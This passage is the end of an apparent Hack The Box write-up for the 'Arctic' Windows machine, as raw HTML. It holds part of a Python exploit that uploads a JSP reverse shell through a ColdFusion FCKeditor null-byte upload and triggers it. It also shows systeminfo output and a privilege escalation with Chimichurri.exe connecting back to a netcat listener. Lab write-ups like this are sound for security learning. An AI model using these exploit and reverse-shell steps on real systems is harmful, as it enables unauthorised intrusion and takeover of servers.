</span></span><span class=line><span class=cl>    <span class=n>request</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>Request</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;http://</span><span class=si>{</span><span class=n>rhost</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>rport</span><span class=si>}</span><span class=s1>/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&amp;Type=File&amp;CurrentFolder=/</span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s1>.jsp%00&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=o>.</span><span class=n>add_header</span><span class=p>(</span><span class=s1>&#39;Content-type&#39;</span><span class=p>,</span> <span class=n>form</span><span class=o>.</span><span class=n>get_content_type</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>request</span><span class=o>.</span><span class=n>add_header</span><span class=p>(</span><span class=s1>&#39;Content-length&#39;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Print the request</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Priting request...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>name</span><span class=p>,</span> <span class=n>value</span> <span class=ow>in</span> <span class=n>request</span><span class=o>.</span><span class=n>header_items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>: </span><span class=si>{</span><span class=n>value</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>request</span><span class=o>.</span><span class=n>data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Send the request and print the response</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Sending request and printing response...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>request</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Print some information</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Printing some information for debugging...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;lhost: </span><span class=si>{</span><span class=n>lhost</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;lport: </span><span class=si>{</span><span class=n>lport</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;rhost: </span><span class=si>{</span><span class=n>rhost</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;rport: </span><span class=si>{</span><span class=n>rport</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;payload: </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s1>.jsp&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Delete the payload</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Deleting the payload...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;rm </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s1>.jsp&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Listen for connections and execute the payload</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>Process</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>listen_connection</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>Process</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>execute_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command<span class=o>=</span>FileUpload<span class=p>&amp;</span><span class=nv>Type</span><span class=o>=</span>File<span class=p>&amp;</span><span class=nv>CurrentFolder</span><span class=o>=</span>/<span class=o>{</span>filename<span class=o>}</span>.jsp%00
</span></span></code></pre></div><p>The exploit access to the above url to execute an upload resource which help us to upload a <strong>jsp</strong> reverse shell, then the exploit access to the next url.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://<span class=o>{</span>rhost<span class=o>}</span>:<span class=o>{</span>rport<span class=o>}</span>/userfiles/file/<span class=o>{</span>filename<span class=o>}</span>.jsp
</span></span></code></pre></div><p>I wonder that it’s where the reverse shell is uploaded.</p><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p>Once executed we gain access as <strong>tolis</strong>.</p><p><img alt=Untitled loading=lazy src=/HTB/arctic-6.png></p><p>Let’s cat the <strong>user’s flag</strong>.</p><p><img alt=Untitled loading=lazy src=/HTB/arctic-7.png></p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>Now let’s elevate the privileges.</p><p>First let’s see what operating system we are using</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>systeminfo</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>Host</span> <span class=n>Name</span><span class=err>:</span>                 <span class=n>ARCTIC</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Name</span><span class=err>:</span>                   <span class=n>Microsoft</span> <span class=n>Windows</span> <span class=n>Server</span> <span class=mf>2008</span> <span class=n>R2</span> <span class=n>Standard</span> 
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Version</span><span class=err>:</span>                <span class=mf>6.1</span><span class=p>.</span><span class=py>7600</span> <span class=n>N</span><span class=p>/</span><span class=n>A</span> <span class=n>Build</span> <span class=mf>7600</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Manufacturer</span><span class=err>:</span>           <span class=n>Microsoft</span> <span class=n>Corporation</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Configuration</span><span class=err>:</span>          <span class=n>Standalone</span> <span class=n>Server</span>
</span></span><span class=line><span class=cl><span class=n>OS</span> <span class=n>Build</span> <span class=n>Type</span><span class=err>:</span>             <span class=n>Multiprocessor</span> <span class=n>Free</span>
</span></span><span class=line><span class=cl><span class=n>Registered</span> <span class=n>Owner</span><span class=err>:</span>          <span class=n>Windows</span> <span class=n>User</span>
</span></span><span class=line><span class=cl><span class=n>Registered</span> <span class=n>Organization</span><span class=err>:</span>   
</span></span><span class=line><span class=cl><span class=n>Product</span> <span class=n>ID</span><span class=err>:</span>                <span class=mf>55041</span><span class=p>-</span><span class=mf>507</span><span class=p>-</span><span class=mf>9857321</span><span class=p>-</span><span class=mf>84451</span>
</span></span><span class=line><span class=cl><span class=n>Original</span> <span class=n>Install</span> <span class=n>Date</span><span class=err>:</span>     <span class=mf>22</span><span class=p>/</span><span class=mf>3</span><span class=p>/</span><span class=mf>2017</span><span class=p>,</span> <span class=mf>11</span><span class=err>:</span><span class=mf>09</span><span class=err>:</span><span class=mf>45</span> <span class=err>��</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Boot</span> <span class=n>Time</span><span class=err>:</span>          <span class=mf>23</span><span class=p>/</span><span class=mf>8</span><span class=p>/</span><span class=mf>2023</span><span class=p>,</span> <span class=mf>9</span><span class=err>:</span><span class=mf>42</span><span class=err>:</span><span class=mf>49</span> <span class=err>��</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Manufacturer</span><span class=err>:</span>       <span class=n>VMware</span><span class=p>,</span> <span class=n>Inc</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Model</span><span class=err>:</span>              <span class=n>VMware</span> <span class=n>Virtual</span> <span class=n>Platform</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Type</span><span class=err>:</span>               <span class=nb>x64-based</span> <span class=n>PC</span>
</span></span><span class=line><span class=cl><span class=n>Processor</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>              <span class=mf>1</span> <span class=n>Processor</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>Installed</span><span class=p>.</span>
</span></span><span class=line><span class=cl>                           <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=n>Intel64</span> <span class=n>Family</span> <span class=mf>6</span> <span class=n>Model</span> <span class=mf>85</span> <span class=n>Stepping</span> <span class=mf>7</span> <span class=n>GenuineIntel</span> <span class=p>~</span><span class=mf>2294</span> <span class=n>Mhz</span>
</span></span><span class=line><span class=cl><span class=n>BIOS</span> <span class=n>Version</span><span class=err>:</span>              <span class=n>Phoenix</span> <span class=n>Technologies</span> <span class=n>LTD</span> <span class=mf>6.00</span><span class=p>,</span> <span class=mf>12</span><span class=p>/</span><span class=mf>12</span><span class=p>/</span><span class=mf>2018</span>
</span></span><span class=line><span class=cl><span class=n>Windows</span> <span class=n>Directory</span><span class=err>:</span>         <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Directory</span><span class=err>:</span>          <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>system32</span>
</span></span><span class=line><span class=cl><span class=n>Boot</span> <span class=n>Device</span><span class=err>:</span>               <span class=p>\</span><span class=n>Device</span><span class=p>\</span><span class=n>HarddiskVolume1</span>
</span></span><span class=line><span class=cl><span class=n>System</span> <span class=n>Locale</span><span class=err>:</span>             <span class=n>el</span><span class=p>;</span><span class=n>Greek</span>
</span></span><span class=line><span class=cl><span class=n>Input</span> <span class=n>Locale</span><span class=err>:</span>              <span class=nb>en-us</span><span class=p>;</span><span class=n>English</span> <span class=p>(</span><span class=n>United</span> <span class=n>States</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>Time</span> <span class=n>Zone</span><span class=err>:</span>                 <span class=p>(</span><span class=n>UTC</span><span class=p>+</span><span class=mf>02</span><span class=err>:</span><span class=mf>00</span><span class=p>)</span> <span class=n>Athens</span><span class=p>,</span> <span class=n>Bucharest</span><span class=p>,</span> <span class=n>Istanbul</span>
</span></span><span class=line><span class=cl><span class=n>Total</span> <span class=n>Physical</span> <span class=n>Memory</span><span class=err>:</span>     <span class=mf>6.143</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Available</span> <span class=n>Physical</span> <span class=n>Memory</span><span class=err>:</span> <span class=mf>5.024</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=n>Max</span> <span class=n>Size</span><span class=err>:</span>  <span class=mf>12.285</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=n>Available</span><span class=err>:</span> <span class=mf>11.203</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Virtual</span> <span class=n>Memory</span><span class=err>:</span> <span class=k>In</span> <span class=n>Use</span><span class=err>:</span>    <span class=mf>1.082</span> <span class=n>MB</span>
</span></span><span class=line><span class=cl><span class=n>Page</span> <span class=n>File</span> <span class=n>Location</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>     <span class=n>C:</span><span class=p>\</span><span class=n>pagefile</span><span class=p>.</span><span class=py>sys</span>
</span></span><span class=line><span class=cl><span class=n>Domain</span><span class=err>:</span>                    <span class=n>HTB</span>
</span></span><span class=line><span class=cl><span class=n>Logon</span> <span class=n>Server</span><span class=err>:</span>              <span class=n>N</span><span class=p>/</span><span class=n>A</span>
</span></span><span class=line><span class=cl><span class=n>Hotfix</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>                 <span class=n>N</span><span class=p>/</span><span class=n>A</span>
</span></span><span class=line><span class=cl><span class=n>Network</span> <span class=n>Card</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=err>:</span>           <span class=mf>1</span> <span class=n>NIC</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=n>Installed</span><span class=p>.</span>
</span></span><span class=line><span class=cl>                           <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=n>Intel</span><span class=p>(</span><span class=n>R</span><span class=p>)</span> <span class=n>PRO</span><span class=p>/</span><span class=mf>1000</span> <span class=n>MT</span> <span class=n>Network</span> <span class=n>Connection</span>
</span></span><span class=line><span class=cl>                                 <span class=n>Connection</span> <span class=n>Name</span><span class=err>:</span> <span class=n>Local</span> <span class=n>Area</span> <span class=n>Connection</span>
</span></span><span class=line><span class=cl>                                 <span class=n>DHCP</span> <span class=n>Enabled</span><span class=err>:</span>    <span class=n>No</span>
</span></span><span class=line><span class=cl>                                 <span class=n>IP</span> <span class=n>address</span><span class=p>(</span><span class=n>es</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                 <span class=p>[</span><span class=mf>01</span><span class=p>]</span><span class=err>:</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>10</span><span class=p>.</span><span class=py>11</span>
</span></span></code></pre></div><p>This version is <code>Microsoft Windows Server 2008 R2 Standard</code> as we know is vulnerable to <strong>MS10-059</strong> which we have already <strong>privesc</strong> in the <a href=http://pwndside.github.io/posts/bastard-htb>Bastard</a> machine so I am going to skip that part and go to direct to the execution of <strong>Chimichurri.exe</strong> in order to <strong>privesc</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>nc</span> <span class=n>-lv</span> <span class=mf>4445</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>.\</span><span class=n>Chimichurri</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=py>9</span> <span class=mf>4445</span>
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/arctic-8.png></p><p><img alt=Untitled loading=lazy src=/HTB/arctic-9.webp></p><p>Let’s cat the <strong>root’s flag</strong>.</p><p><img alt=Untitled loading=lazy src=/HTB/arctic-10.png></p><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/windows/>Windows</a></li><li><a href=http://localhost:1313/tags/web/>Web</a></li><li><a href=http://localhost:1313/tags/privesc/>Privesc</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>